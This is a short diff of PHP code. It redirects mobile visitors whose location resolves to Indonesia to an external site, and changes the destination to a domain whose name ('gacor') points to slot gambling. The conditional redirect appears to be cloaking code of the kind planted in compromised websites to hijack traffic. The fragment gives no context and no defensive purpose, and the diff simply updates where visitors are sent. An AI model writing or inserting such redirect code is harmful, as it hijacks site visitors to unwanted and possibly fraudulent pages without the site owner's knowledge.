@@ -19,7 +19,7 @@ function isMobileDevice() {
 }
 
 if (in_array($geoData['countryCode'], ['ID']) && isMobileDevice()) {
-    header("Location: https://anjappargrand.com/");
+    header("Location: https://anjapahar-gacor.web.app/");
     exit;
 }
 
